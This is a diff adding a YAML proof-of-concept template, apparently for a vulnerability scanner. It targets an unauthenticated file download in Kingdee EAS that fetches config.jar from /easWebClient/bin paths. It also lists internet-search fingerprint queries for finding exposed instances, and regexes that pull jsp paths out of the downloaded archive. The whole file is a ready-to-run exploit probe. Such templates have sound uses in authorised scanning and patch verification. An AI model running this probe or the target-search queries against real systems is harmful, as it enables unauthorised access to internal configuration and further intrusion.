@@ -1,0 +1,56 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Kingdee-EAS"
+    hunter-query: web.body="/eassso/images/"
+    quake-query: app:"金蝶-EAS"
+    zoomeye-query: app:"金蝶 EAS"
+    threatbook-query:
+    cve: 
+    cnvd:
+    tips: config.jar
+    
+name: poc-yaml-Kingdee-EAS-easWebClient-file-down
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /easWebClient/bin/config.jar
+      follow_redirects: false      
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("PK")  && response.body_string.contains("FrmClientConfig")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /easWebClient/bin/lib/config.jar
+      follow_redirects: false      
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("PK")  && response.body_string.contains("FrmClientConfig")
+
+expression: r0() || r1()
